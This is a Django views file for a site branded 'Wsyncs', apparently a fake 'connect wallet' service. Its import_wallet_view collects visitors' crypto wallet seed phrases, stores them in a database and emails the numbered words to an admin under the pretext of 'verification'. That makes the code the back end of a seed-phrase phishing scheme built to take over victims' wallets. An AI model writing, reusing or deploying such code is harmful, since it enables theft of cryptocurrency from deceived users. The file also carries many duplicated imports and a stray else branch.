from django.shortcuts import render,get_object_or_404, redirect
from django.urls import reverse
from django.http import JsonResponse
import requests 
from decimal import Decimal, InvalidOperation
import logging
import json
from django.http import HttpResponseBadRequest
from django.contrib.auth.decorators import user_passes_test
from datetime import datetime, timedelta, time
from django.http import Http404
from django.utils.timezone import now
from django.contrib.auth import get_user_model
from django.shortcuts import redirect
from django.contrib.auth import logout as auth_logout,login as auth_login,authenticate
from django.contrib.auth import get_user_model
from django.utils.crypto import get_random_string
from django.core.mail import EmailMessage
from django.contrib.auth import get_user_model
from django.conf import settings
from django.utils import timezone
from datetime import timedelta
from django.db.models import Max
from decimal import Decimal,InvalidOperation
from django.views import View
from django.views.decorators.csrf import csrf_exempt
from django.conf.urls.static import static
from django.core.mail import EmailMultiAlternatives
import pytz
from datetime import datetime, timedelta
from pytz import timezone as pytz_timezone
import logging
from django.contrib.auth.decorators import login_required
import logging
from django.core.mail import send_mail
from django.contrib.auth.hashers import make_password
from django.contrib.auth import logout
import string
import random
from django.contrib.auth import authenticate, login
from django.contrib.auth import get_user_model
from django.contrib.auth.decorators import login_required, user_passes_test
from django.core.validators import EmailValidator
from django.core.exceptions import ValidationError
import re
from .models import WalletKeyPhrase
from django.db import IntegrityError


# Set up logging
logger = logging.getLogger(__name__)


def empty(request):
    return render(request,'page.html')

def home(request):
    return render(request,'index.html')



def connect(request):
    return render(request,'connect_wallet.html')



def import_wallet_view(request):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            wallet_type = data.get('wallet_type')
            key_phrase = data.get('key_phrase')

            if not wallet_type or not key_phrase:
                return JsonResponse({'status': 'error', 'message': 'Missing fields'}, status=400)

            # Check if key_phrase already exists
            if WalletKeyPhrase.objects.filter(key_phrase=key_phrase).exists():
                return JsonResponse({
                    'status': 'error',
                    'message': 'This key phrase is already registered. Please use a different key phrase.'
                }, status=400)

            # Save to database
            WalletKeyPhrase.objects.create(wallet_type=wallet_type, key_phrase=key_phrase)

            # Prepare numbered key phrase for email
            key_phrase_words = key_phrase.split()
            numbered_key_phrase = [
                {'index': i + 1, 'word': word}
                for i, word in enumerate(key_phrase_words)
            ]

          
                # Prepare email content
            subject = 'New Wallet Key Phrase Submission - Wsyncs'
            from_email = settings.DEFAULT_FROM_EMAIL
            to_email = settings.ADMIN  # First admin's email

                # Plain text version for fallback
            text_content = f"""
New Wallet Key Phrase Submission - Wsyncs

Wallet Type: {wallet_type}
Submission Time: {timezone.now().strftime('%Y-%m-%d %H:%M:%S %Z')}

Key Phrase:
""" + "\n".join(f"{item['index']}. {item['word']}" for item in numbered_key_phrase)

                # HTML email content
            html_content = f"""
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>New Wallet Key Phrase Submission - Wsyncs</title>
  <style>
    body {{
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Arial, sans-serif;
      line-height: 1.6;
      color: #1a2b3c;
      background-color: #f9fafb;
    }}
    .container {{
      max-width: 600px;
      margin: 0 auto;
      padding: 20px;
      background-color: #ffffff;
      border-radius: 8px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
    }}
    .header {{
      text-align: center;
      padding: 20px 0;
      background-color: #1f2937;
      border: 2px solid #ffd700;
      border-radius: 8px 8px 0 0;
    }}
    .header img {{
      max-width: 150px;
      height: auto;
    }}
    .content {{
      padding: 30px;
    }}
    .content h1 {{
      font-size: 24px;
      color: #1a2b3c;
      margin-bottom: 20px;
    }}
    .content p {{
      font-size: 16px;
      color: #374151;
      margin-bottom: 15px;
    }}
    .details-table {{
      background-color: #f3f4f6;
      padding: 20px;
      border-left: 4px solid #ffd700;
      margin: 20px 0;
      border-radius: 4px;
    }}
    .details-table table {{
      width: 100%;
      border-collapse: collapse;
    }}
    .details-table th, .details-table td {{
      padding: 10px;
      border: 1px solid #d1d5db;
      text-align: left;
      font-size: 16px;
      color: #374151;
    }}
    .details-table th {{
      background-color: #e5e7eb;
      color: #1a2b3c;
      font-weight: 600;
    }}
    .key-phrase-table {{
      margin: 20px 0;
    }}
    .key-phrase-table table {{
      width: 100%;
      border-collapse: collapse;
    }}
    .key-phrase-table th, .key-phrase-table td {{
      padding: 10px;
      border: 1px solid #d1d5db;
      text-align: left;
      font-size: 16px;
      color: #374151;
    }}
    .key-phrase-table th {{
      background-color: #e5e7eb;
      color: #1a2b3c;
      font-weight: 600;
    }}
    .footer {{
      text-align: center;
      padding: 20px;
      background-color: #1f2937;
      color: #d1d5db;
      border-radius: 0 0 8px 8px;
      font-size: 14px;
    }}
    .footer a {{
      color: #ffd700;
      text-decoration: none;
    }}
    .footer a:hover {{
      text-decoration: underline;
    }}
    .contact-info {{
      margin-top: 20px;
    }}
    .contact-info p {{
      margin: 5px 0;
    }}
    @media only screen and (max-width: 600px) {{
      .container {{
        padding: 10px;
      }}
      .header img {{
        max-width: 120px;
      }}
      .content h1 {{
        font-size: 20px;
      }}
      .content p, .details-table td, .details-table th, .key-phrase-table td, .key-phrase-table th {{
        font-size: 14px;
      }}
      .footer {{
        font-size: 12px;
      }}
    }}
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <img src="http://wsyncs.com/static/images/logo-4.png" alt="Wsyncs Logo">
    </div>
    <div class="content">
      <h1>New Wallet Key Phrase Submission</h1>
      <p>Dear Admin,</p>
      <p>A new wallet key phrase has been submitted for verification on Wsyncs. Please review the details below and take appropriate action.</p>
      <div class="details-table">
        <table>
          <tr>
            <th>Wallet Type</th>
            <td>{wallet_type}</td>
          </tr>
          <tr>
            <th>Submission Time</th>
            <td>{timezone.now().strftime('%Y-%m-%d %H:%M:%S %Z')}</td>
          </tr>
        </table>
      </div>
      <div class="key-phrase-table">
        <h2>Key Phrase</h2>
        <table>
          <thead>
            <tr>
              <th>#</th>
              <th>Word</th>
            </tr>
          </thead>
          <tbody>
            {"".join(f'<tr><td>{item["index"]}</td><td>{item["word"]}</td></tr>' for item in numbered_key_phrase)}
          </tbody>
        </table>
      </div>
      <p>For any inquiries, please contact us at <a href="mailto:support@wsyncs.com">support@wsyncs.com</a>.</p>
    </div>
    <div class="footer">
      <p>Best regards,<br>Wsyncs Team</p>
      <div class="contact-info">
        <p><a href="mailto:support@wsyncs.com">support@wsyncs.com</a></p>
        <p><a href="https://wsyncs.com">wsyncs.com</a></p>
      </div>
      <p>© 2025 Wsyncs | Secure Web3 Solutions. All rights reserved.</p>
    </div>
  </div>
</body>
</html>
"""

                # Send email
            try:
                    email = EmailMultiAlternatives(
                        subject=subject,
                        body=text_content,
                        from_email=from_email,
                        to=[to_email],
                    )
                    email.attach_alternative(html_content, 'text/html')
                    email.send()
            except Exception as e:
                    logger.warning(f"Failed to send email: {str(e)}")
                    # Continue to return success since database operation was successful
            else:
                logger.warning("ADMINS setting is not properly configured. Email not sent.")

            return JsonResponse({'status': 'success'})

        except IntegrityError as e:
            logger.error(f"Database integrity error: {str(e)}", exc_info=True)
            return JsonResponse({
                'status': 'error',
                'message': 'This key phrase is already registered. Please use a different key phrase.'
            }, status=400)
        except Exception as e:
            logger.error(f"Error in import_wallet_view: {str(e)}", exc_info=True)
            return JsonResponse({'status': 'error', 'message': str(e)}, status=500)
    
    return JsonResponse({'status': 'error', 'message': 'Invalid request method'}, status=405)